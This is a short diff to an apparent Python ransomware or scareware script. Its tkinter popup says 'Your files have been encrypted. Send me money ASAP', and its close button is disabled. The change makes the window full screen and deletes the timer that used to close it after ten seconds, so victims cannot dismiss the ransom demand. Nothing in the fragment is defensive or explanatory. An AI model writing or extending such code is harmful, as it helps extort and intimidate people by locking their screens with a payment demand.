@@ -8,14 +8,13 @@ import threading
 def create_popup():
     root = tkinter.Tk()
     root.title("Attention")
-    root.geometry("300x200")
+    root.geometry("1920x1080")
 
     root.protocol("WM_DELETE_WINDOW", lambda: None)
 
     label = tkinter.Label(root, text="Your files have been encrypted. Send me money ASAP", padx=20, pady=20)
     label.pack(expand=True)
 
-    root.after(10000, root.destroy)
     root.mainloop()
     
 
